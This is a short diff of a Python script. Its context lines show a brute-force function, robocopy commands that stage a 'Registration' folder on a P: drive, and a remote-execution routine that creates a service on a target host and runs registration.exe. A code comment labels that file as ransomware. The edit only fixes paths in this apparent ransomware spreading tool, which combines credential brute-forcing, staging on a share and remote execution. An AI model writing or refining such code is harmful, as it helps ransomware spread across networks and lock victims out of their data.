@@ -67,8 +67,8 @@ def bruteForce(user, ipAddress):
 
 #Transfer
 def transferFile():
-    os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder
-    os.system("robocopy P:\\ C:\\Users\\IEUser\Downloads  ")#Fresh copy to start thr cycle again 
+    os.system("robocopy C:\\Users\\IEUser\\Downloads\\Registration P:\\  ") #P:\\ zip folder
+    os.system("robocopy P:\\Registration C:\\Users\\IEUser\\Downloads\\  ")#Fresh copy to start thr cycle again 
 
 
 #Remote execute file
@@ -77,7 +77,7 @@ def remoteExecute(ipAddress, user, password):
     c.connect()
     try:
         c.create_service()
-        stdout, stderr, rc = c.run_executable("P:\\registration.exe") #Execute ransomware from P Drive
+        stdout, stderr, rc = c.run_executable("P:\\Registration\registration.exe") #Execute ransomware from P Drive
     except:
         print("done")
 
